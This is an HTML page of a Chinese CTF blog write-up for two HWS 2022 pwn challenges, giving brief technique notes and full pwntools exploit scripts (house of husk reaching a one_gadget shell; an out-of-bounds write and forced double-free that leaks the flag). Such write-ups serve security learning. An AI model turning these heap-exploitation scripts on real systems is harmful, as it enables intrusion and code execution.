@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.mark0519.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[WP]-2022 HWS送分题大量的printf，明显house of husk。rename泄露libc;unsortedbinAttack改大global_max_fast计算__printf_arginfo_table和__printf_function_table的偏移;申请特定大小的fastbin修改__printf_arginfo_table到可控的堆上;构造__printf_arg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wp-HWS2022">
+<meta property="og:url" content="https://blog.mark0519.com/post/wp-HWS2022.html">
+<meta property="og:site_name" content="Mark&#39;s blog">
+<meta property="og:description" content="[WP]-2022 HWS送分题大量的printf，明显house of husk。rename泄露libc;unsortedbinAttack改大global_max_fast计算__printf_arginfo_table和__printf_function_table的偏移;申请特定大小的fastbin修改__printf_arginfo_table到可控的堆上;构造__printf_arg">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-01-25T11:36:25.000Z">
+<meta property="article:modified_time" content="2022-01-25T11:38:32.576Z">
+<meta property="article:author" content="Mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="HWS2022">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.mark0519.com/post/wp-HWS2022.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>wp-HWS2022 | Mark's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mark's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.mark0519.com/post/wp-HWS2022.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+      <meta itemprop="name" content="Mark0519">
+      <meta itemprop="description" content="菜鸡CTFer的自留地">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mark's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          wp-HWS2022
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-25 19:36:25 / 修改时间：19:38:32" itemprop="dateCreated datePublished" datetime="2022-01-25T19:36:25+08:00">2022-01-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="WP-2022-HWS"><a href="#WP-2022-HWS" class="headerlink" title="[WP]-2022 HWS"></a>[WP]-2022 HWS</h1><h3 id="送分题"><a href="#送分题" class="headerlink" title="送分题"></a>送分题</h3><p>大量的printf，明显house of husk。<br>rename泄露libc;<br>unsortedbinAttack改大<code>global_max_fast</code><br>计算<code>__printf_arginfo_table</code>和<code>__printf_function_table</code>的偏移;<br>申请特定大小的fastbin修改<code>__printf_arginfo_table</code>到可控的堆上;<br>构造<code>__printf_arginfo_table</code>的[‘s’]位置为one_gadget;<br>令<code>__printf_function_table</code>不为空;<br>最后调用printf(“%s”)开启调用链getshell.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
+
+local <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">if</span> local<span class="token punctuation">:</span>
+    <span class="token comment"># p = process("./pwn")</span>
+    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">,</span>
+            env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span><span class="token string">"/home/sjj/glibc-all-in-one/2.27-3ubuntu1.2_amd64/libc-2.27.so"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"1.13.162.249"</span><span class="token punctuation">,</span><span class="token string">"10001"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">log</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]==>"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">offset</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> num<span class="token operator">*</span><span class="token number">2</span>
+
+arginfo <span class="token operator">=</span> <span class="token number">4114544</span> <span class="token comment"># __printf_arginfo_table</span>
+function <span class="token operator">=</span> <span class="token number">4130392</span> <span class="token comment"># __printf_function_table</span>
+
+main_arena <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span> 
+size_1 <span class="token operator">=</span> offset<span class="token punctuation">(</span>arginfo <span class="token operator">-</span> main_arena<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x50</span>
+size_2 <span class="token operator">=</span> offset<span class="token punctuation">(</span>function <span class="token operator">-</span> main_arena<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x50</span>
+log<span class="token punctuation">(</span>size_1<span class="token punctuation">)</span>
+log<span class="token punctuation">(</span>size_2<span class="token punctuation">)</span>
+<span class="token comment"># gdb.attach(p)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"big box, what size?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size_1<span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"bigger box, what size?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size_2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" rename?(y/n)"</span><span class="token punctuation">,</span><span class="token string">"y"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Now your name is:"</span><span class="token punctuation">)</span>
+addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+log<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">96</span>
+log<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>
+global_max_fast <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">4118848</span>
+ogg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f365</span> <span class="token punctuation">,</span><span class="token number">0x4f3c2</span> <span class="token punctuation">,</span><span class="token number">0x10a45c</span><span class="token punctuation">]</span>
+one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span>ogg<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+log<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
+<span class="token comment"># gdb.attach(p)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"please input your new name!"</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>global_max_fast<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" box or bigger box?(1:big/2:bigger)"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment"># gdb.attach(p)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Let's edit,"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment"># flag&#123;5hen_m3_5hi_kuai_1e_xin9_Qiu&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="peach"><a href="#peach" class="headerlink" title="peach"></a>peach</h3><p>在bss段上留下了栈地址，通过打印的地址计算出flag地址后4位;<br>chunk_list下标越届，可以填负数;<br>一开始输入”yes\x00”+”a”<em>(0x1d-5)使得换行符\x0a也可以输入到栈上;<br>之后draw的下标越界，draw(-36,”\x00”</em>(0x190)+p16(flag_addr))覆盖arg[0];<br>最后通过堆溢出手动构造doublefree报错带出flag;<br>远程栈地址和本地不太一样需要爆破.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token keyword">from</span> re <span class="token keyword">import</span> I<span class="token punctuation">,</span> L
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc/libc-2.26.so'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./peachw"</span><span class="token punctuation">)</span>
+i <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    local <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">if</span> local<span class="token punctuation">:</span>
+        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./libc/ld-2.26.so"</span><span class="token punctuation">,</span> <span class="token string">"./peachw"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+            env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span><span class="token string">"./libc/libc-2.26.so"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token comment"># p = process(["/home/sjj/glibc-all-in-one/2.26-0ubuntu2.1_amd64/ld-2.26.so", "./peachw"],</span>
+        <span class="token comment">#         env=&#123;"LD_PRELOAD":"/home/sjj/glibc-all-in-one/2.26-0ubuntu2.1_amd64/libc-2.26.so"&#125;)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"1.13.162.249"</span><span class="token punctuation">,</span><span class="token string">"10003"</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">log</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]==>"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Do you like peach?"</span><span class="token punctuation">,</span><span class="token string">"yes\x00"</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1d</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"The peach is "</span><span class="token punctuation">)</span>
+    flag_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+    flag_addr <span class="token operator">-=</span> <span class="token number">96</span>
+    log<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>name<span class="token punctuation">,</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index ?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name your peach  :"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size of your peach:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"please descripe your peach :"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>name<span class="token punctuation">,</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index ?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name your peach  :"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size of your peach:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"please descripe your peach :"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">add_err</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>name<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index ?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name your peach  :"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size of your peach:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">throw</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        cmd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index ?'</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        cmd<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index ?'</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token comment"># gdb.attach(p)</span>
+        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"What's your lucky number?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">draw</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        cmd<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index ?'</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"input the new size of your peach"</span><span class="token punctuation">,</span><span class="token string">'\x00\x03'</span><span class="token punctuation">)</span>
+        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"start to draw your peach \n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>
+
+
+    draw<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x190</span><span class="token operator">+</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">,</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">"bbb"</span><span class="token punctuation">)</span>
+    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">,</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">"bbb"</span><span class="token punctuation">)</span>
+    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">,</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">"bbb"</span><span class="token punctuation">)</span>
+    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    add_err<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0xf6e0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x001</span><span class="token punctuation">)</span>
+    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"*** Error in "</span><span class="token punctuation">)</span>
+        flag <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"invalid"</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"&#123;"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
+            <span class="token keyword">print</span> flag
+            pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">elif</span> <span class="token string">"free()"</span> <span class="token keyword">in</span> flag <span class="token punctuation">:</span>
+            i<span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
+            <span class="token keyword">print</span> i
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># flag&#123;G0od job~~~This is the real peach you get~&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/HWS2022/" rel="tag"># HWS2022</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/pwn-exit-hook.html" rel="prev" title="exit_hook在pwn题中的应用">
+      <i class="fa fa-chevron-left"></i> exit_hook在pwn题中的应用
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
